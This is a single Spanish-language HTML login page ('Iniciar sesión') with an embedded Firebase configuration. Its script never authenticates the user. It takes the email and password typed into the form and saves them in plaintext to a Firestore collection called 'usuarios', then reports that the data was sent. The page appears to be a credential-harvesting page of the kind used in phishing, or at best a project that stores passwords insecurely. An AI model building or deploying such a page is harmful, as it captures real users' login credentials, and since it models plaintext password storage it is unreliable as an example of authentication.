<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Iniciar sesión</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f3f3f3;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    form {
      background-color: white;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    input {
      display: block;
      margin-bottom: 15px;
      width: 100%;
      padding: 10px;
    }
    button {
      padding: 10px 20px;
    }
  </style>
</head>
<body>
  <form id="loginForm">
    <h2>Iniciar sesión</h2>
    <input type="email" id="email" placeholder="Correo electrónico" required />
    <input type="password" id="password" placeholder="Contraseña" required />
    <button type="submit">Enviar</button>
    <p id="msg" style="color: green;"></p>
  </form>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/10.5.2/firebase-firestore-compat.js"></script>

  <script>
    // Tu configuración de Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyAeYcdtKNuEMhV9F13dx8hl9VTw1AD6_g4",
      authDomain: "loginapp-97da2.firebaseapp.com",
      projectId: "loginapp-97da2",
      storageBucket: "loginapp-97da2.appspot.com",
      messagingSenderId: "1071075004144",
      appId: "1:1071075004144:web:67e75c55c7d4836e59fc35",
      measurementId: "G-H7B3WQ834E"
    };

    // Inicializar Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // Manejo del formulario
    const form = document.getElementById('loginForm');
    const msg = document.getElementById('msg');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      try {
        await db.collection("usuarios").add({
          correo: email,
          contraseña: password,
          fecha: new Date()
        });

        msg.textContent = "¡Datos enviados correctamente!";
        form.reset();
      } catch (error) {
        msg.textContent = "Error al enviar los datos.";
        console.error("Error guardando en Firebase:", error);
      }
    });
  </script>
</body>
</html>
